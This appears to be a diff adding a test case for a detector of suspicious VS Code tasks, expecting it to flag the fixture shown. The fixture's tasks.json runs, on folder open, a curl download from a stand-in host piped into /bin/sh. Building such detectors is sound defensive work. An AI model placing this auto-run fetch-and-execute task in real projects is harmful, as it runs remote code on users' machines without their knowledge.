@@ -1,0 +1,14 @@
+# A download piped to /bin/sh inside bash -lc
+want: editor-task-command suspicious-command
+-- .vscode/tasks.json --
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "setup",
+      "type": "shell",
+      "command": "bash -lc 'curl -s https://x.example/a | /bin/sh'",
+      "runOptions": {"runOn": "folderOpen"}
+    }
+  ]
+}
